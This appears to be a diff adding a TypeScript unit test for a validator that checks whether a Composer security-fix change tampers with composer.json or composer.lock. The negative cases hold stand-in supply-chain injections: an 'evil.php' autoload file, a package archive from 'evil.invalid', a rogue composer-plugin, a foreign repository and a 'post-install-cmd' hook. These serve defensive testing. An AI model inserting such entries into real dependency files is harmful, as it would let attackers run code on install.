+    const a = "a".repeat(40), b = "b".repeat(40), c = "c".repeat(40);
+    const json = { name: "app", require: { "symfony/http-foundation": "5.4.0" } }, fixedJson = { name: "app", require: { "symfony/http-foundation": "5.4.54" } };
+    const lock = (packages: unknown[]) => `${JSON.stringify({ _readme: ["x"], "content-hash": "1", packages, "packages-dev": [], "plugin-api-version": "2.6.0" }, null, 4)}\n`;
+    const before = { "composer.json": JSON.stringify(json), "composer.lock": lock([entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.0", b)]) };
+    const fix = fixOf("symfony/http-foundation", "5.4.0", "5.4.54", ["composer.json", "composer.lock"]);
+    const after = (packages: unknown[], top: Record<string, unknown> = {}) => files({ "composer.json": JSON.stringify(fixedJson), "composer.lock": `${JSON.stringify({ _readme: ["x"], "content-hash": "2", packages, "packages-dev": [], "plugin-api-version": "2.6.0", ...top }, null, 4)}\n` });
+    // The fix itself, with descriptive metadata changed on another package, a new dependency, and the newer Composer of
+    // the tool image (examples/composer-security: plugin-api-version 2.9.0 -> 2.11.0).
+    expect(contentProblem("composer", fix, files(before), after([entry("symfony/deprecation-contracts", "v2.5.0", a, { "published-time": "2026-06-27T21:46:34+00:00" }), entry("symfony/http-foundation", "v5.4.54", c), entry("symfony/polyfill-php83", "v1.31.0", c)], { "plugin-api-version": "2.11.0" }))).toBeNull();
+    for (const [packages, why] of [
+      [[entry("symfony/deprecation-contracts", "v2.5.1", a), entry("symfony/http-foundation", "v5.4.54", c)], "changes symfony/deprecation-contracts"],
+      [[entry("symfony/deprecation-contracts", "v2.5.0", a, { autoload: { files: ["evil.php"] } }), entry("symfony/http-foundation", "v5.4.54", c)], "changes symfony/deprecation-contracts"],
+      [[entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.53", c)], "not to the fix's version"],
+      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...entry("symfony/http-foundation", "v5.4.54", c), dist: { type: "zip", url: "https://evil.invalid/x.zip" } }], "outside the pinned public archives"],
+      [[entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.54", c), entry("evil/plugin", "1.0.0", c, { type: "composer-plugin" })], "a composer-plugin"],
+      [[entry("symfony/http-foundation", "v5.4.54", c)], "removes symfony/deprecation-contracts"],
+    ] as const) expect(contentProblem("composer", fix, files(before), after([...packages]))).toContain(why);
+    expect(contentProblem("composer", fix, files(before), after([entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.54", c)], { repositories: [{ type: "vcs", url: "https://evil.invalid" }] }))).toContain("changes its repositories");
+    // composer.json: only the planned requirement, raised as changedManifest raises it.
+    const looser = files({ "composer.json": JSON.stringify({ ...fixedJson, scripts: { "post-install-cmd": "evil" } }), "composer.lock": before["composer.lock"] });
+    expect(contentProblem("composer", fix, files(before), looser)).toContain("composer.json is not what Ludion writes");
   });
 });
